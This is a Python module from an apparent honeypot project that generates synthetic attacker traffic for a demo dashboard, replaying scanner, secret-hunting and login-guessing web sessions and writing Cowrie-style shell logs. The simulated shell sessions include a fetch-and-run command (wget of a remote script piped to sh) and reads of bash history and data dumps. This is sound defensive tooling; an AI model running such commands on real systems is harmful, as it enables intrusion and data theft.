"""Synthetic Rabbit Hole traffic for the dashboard demo.

Web traffic is replayed through the real ``WebEngine`` with a simulated clock,
so the demo log has exactly the format the live decoy writes. Shell traffic is
written as Cowrie-style JSON events.
"""
from __future__ import annotations

from datetime import datetime, timedelta, timezone
import json
from pathlib import Path
import random

from .config import RabbitConfig
from .web import WebEngine

BROWSER = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36"
TOOLS = ["Nikto/2.5.0", "sqlmap/1.8#stable (https://sqlmap.org)", "curl/8.5.0",
         "Mozilla/5.0 zgrab/0.x", "python-requests/2.31.0", "Go-http-client/1.1"]
SCANNER_PATHS = ["/", "/.env", "/robots.txt", "/backup/", "/wp-login.php", "/.git/config",
                 "/admin/", "/phpmyadmin/", "/server-status", "/api/v1/", "/config.php.bak"]


class Clock:
    def __init__(self, start: datetime):
        self.now = start

    def __call__(self) -> float:
        return self.now.timestamp()

    def wait(self, seconds: float) -> None:
        self.now += timedelta(seconds=seconds)


def _ip(rng: random.Random) -> str:
    return rng.choice(["192.0.2", "198.51.100", "203.0.113"]) + "." + str(rng.randint(1, 254))


def simulate_web(config: RabbitConfig, sessions: int, days: int, seed: int, end: datetime) -> list:
    rng = random.Random(seed)
    engine = WebEngine(config)
    paths = {}
    for scenario in engine.scenarios:
        paths.update(scenario.node_paths())
    events = []
    for index in range(sessions):
        start = end - timedelta(seconds=rng.uniform(600, days * 86400))
        clock = Clock(start)
        engine.clock = clock
        ip, port = _ip(rng), rng.randint(20000, 65000)
        persona = rng.choices(["scanner", "explorer", "env_hunter", "git_reader", "api_prober"],
                              [40, 22, 18, 10, 10])[0]
        cookie = None
        agent = rng.choice(TOOLS) if persona in {"scanner", "api_prober"} else BROWSER

        def request(path, method="GET", headers=None, body=b""):
            nonlocal cookie
            sent = {"User-Agent": agent, **(headers or {})}
            if cookie and persona not in {"scanner", "api_prober"}:
                sent["Cookie"] = "PHPSESSID=" + cookie
            response = engine.handle(method, path, sent, body, (ip, port), ("10.10.10.2", 8084))
            set_cookie = response.headers.get("Set-Cookie")
            if set_cookie and cookie is None:
                cookie = set_cookie.split("=", 1)[1].split(";", 1)[0]
            events.append(response.event)
            return response

        def go(probability: float) -> bool:
            return rng.random() < probability

        if persona == "scanner":
            for path in rng.sample(SCANNER_PATHS, rng.randint(4, len(SCANNER_PATHS))):
                request(path)
                clock.wait(rng.uniform(0.05, 1.5))
            continue
        if persona == "api_prober":
            request("/api/v1/")
            clock.wait(rng.uniform(0.5, 3))
            request(paths.get("api-users", "/api/v1/users"))
            clock.wait(rng.uniform(0.5, 3))
            if go(0.3):
                request("/api/docs")
            continue
        if persona == "explorer":
            request("/robots.txt")
            clock.wait(rng.uniform(5, 40))
            if not go(0.85):
                continue
            request(paths["backup-index"])
            clock.wait(rng.uniform(8, 60))
            branch = rng.random()
            if branch < 0.6 and go(0.85):
                config_body = request(paths["backup-config"]).body.decode("utf-8")
                key = json.loads(config_body)["api"]["key"]
                clock.wait(rng.uniform(20, 120))
                if go(0.75):
                    request(paths["api-index"])
                    clock.wait(rng.uniform(10, 60))
                    if go(0.8):
                        request(paths["api-users"], headers={"X-API-Key": key})
                        for _ in range(rng.randint(0, 5)):
                            clock.wait(rng.uniform(3, 30))
                            request(paths["api-users"] + "/" + str(1000 + rng.randint(0, 11)),
                                    headers={"X-API-Key": key})
                    if go(0.45):
                        clock.wait(rng.uniform(10, 50))
                        request(paths["api-invoices"], headers={"X-API-Key": key if go(0.85) else "test"})
            elif go(0.8):
                request(paths["backup-readme"])
                clock.wait(rng.uniform(15, 90))
                if go(0.75):
                    request(paths["old-exports"])
                    clock.wait(rng.uniform(5, 40))
                    if go(0.8):
                        request(paths["users-export"])
            if go(0.15):
                clock.wait(rng.uniform(400, 1800))
                request(paths["backup-index"])
                clock.wait(rng.uniform(5, 30))
                request(paths["backup-config"])
            continue
        entry = "env" if persona == "env_hunter" else "git-config"
        request(paths[entry])
        clock.wait(rng.uniform(5, 45))
        if persona == "git_reader":
            if not go(0.75):
                continue
            request(paths["deploy-notes"])
            clock.wait(rng.uniform(10, 70))
        if not go(0.8):
            continue
        request(paths["admin-login"])
        clock.wait(rng.uniform(8, 40))
        for _ in range(rng.randint(1, 4)):
            user = rng.choice(["admin", "administrator", config.organization["admin_user"], "root"])
            request(paths["admin-login"], "POST", {"Content-Type": "application/x-www-form-urlencoded"},
                    f"username={user}&password=Passw0rd{rng.randint(1, 999)}".encode())
            clock.wait(rng.uniform(2, 15))
        if go(0.7):
            request(paths["admin-home"])
            clock.wait(rng.uniform(10, 60))
            if go(0.75):
                request(paths["admin-exports"])
                clock.wait(rng.uniform(5, 40))
                if go(0.8):
                    request(paths["customers-export"])
    events.sort(key=lambda e: e["timestamp"])
    return events


def simulate_shell(config: RabbitConfig, sessions: int, days: int, seed: int, end: datetime) -> list:
    rng = random.Random(seed + 1)
    scenario = config.selected("shell")[0]
    paths = scenario.node_paths()
    owner = config.organization["admin_user"]
    events = []
    for index in range(sessions):
        clock = Clock(end - timedelta(seconds=rng.uniform(600, days * 86400)))
        sid = f"{rng.getrandbits(48):012x}"
        ip = _ip(rng)
        protocol = rng.choices(["ssh", "telnet"], [75, 25])[0]
        opened = clock.now

        def emit(eventid, **fields):
            events.append({"eventid": eventid, "timestamp": clock.now.isoformat(), "session": sid,
                           "src_ip": ip, "src_port": rng.randint(30000, 60000), "sensor": "trap-demo",
                           "demo": True, **fields})

        emit("cowrie.session.connect", protocol=protocol, dst_port=22 if protocol == "ssh" else 23)
        clock.wait(rng.uniform(0.5, 3))
        for _ in range(rng.randint(0, 4)):
            emit("cowrie.login.failed", username=rng.choice(["root", "admin", "ubuntu"]),
                 password=rng.choice(["123456", "admin", "password", "root"]))
            clock.wait(rng.uniform(0.5, 4))
        user = rng.choice(["root", owner])
        emit("cowrie.login.success", username=user, password="P@ssw0rd")
        clock.wait(rng.uniform(1, 6))
        persona = rng.choices(["bot", "looker", "deep"], [45, 30, 25])[0]
        commands = ["uname -a", "cat /proc/cpuinfo | grep name | wc -l"]
        if persona == "bot":
            commands += ["cd /tmp && wget http://198.51.100.77/x.sh && sh x.sh", "exit"]
        else:
            commands += [f"ls -la /home/{owner}", f"cat /home/{owner}/notes.txt"]
            if persona == "deep" or rng.random() < 0.3:
                commands += [f"cat {paths['backup-conf']}", f"ls {paths['dumps-dir']}"]
                if persona == "deep":
                    commands += [f"head -20 {paths['dump-file']}", f"cat /home/{owner}/.bash_history"]
            commands.append("exit")
        for command in commands:
            emit("cowrie.command.input", input=command)
            clock.wait(rng.uniform(2, 45) if persona != "bot" else rng.uniform(0.2, 2))
        emit("cowrie.session.closed", duration=round((clock.now - opened).total_seconds(), 1))
    events.sort(key=lambda e: e["timestamp"])
    return events


def write_demo(root: Path, directory: Path, seed: int = 6238, days: int = 30) -> dict:
    """Create demo config, secret and logs under ``directory``; returns paths and counts."""
    directory.mkdir(parents=True, exist_ok=True)
    config_path = directory / "rabbit-hole.json"
    if not config_path.exists():
        example = json.loads((root / "config/rabbit-hole.example.json").read_text(encoding="utf-8"))
        example["project_root"] = str(Path("..") / ".." )
        example["secret_path"] = "evidence/demo/rabbit-hole.secret"
        example["web"]["log_path"] = "evidence/demo/rabbit-hole-web.jsonl"
        config_path.write_text(json.dumps(example, indent=2, ensure_ascii=False) + "\n", encoding="utf-8")
    from .config import load
    config = load(config_path)
    end = datetime.now(timezone.utc) - timedelta(seconds=30)
    web_events = simulate_web(config, 420, days, seed, end)
    shell_events = simulate_shell(config, 140, days, seed, end)
    web_log = directory / "rabbit-hole-web.jsonl"
    cowrie_log = directory / "cowrie.jsonl"
    web_log.write_text("".join(json.dumps(e, ensure_ascii=False, sort_keys=True) + "\n" for e in web_events),
                       encoding="utf-8")
    cowrie_log.write_text("".join(json.dumps(e, sort_keys=True) + "\n" for e in shell_events), encoding="utf-8")
    return {"config": config_path, "web_log": web_log, "cowrie_log": cowrie_log,
            "web_events": len(web_events), "shell_events": len(shell_events)}
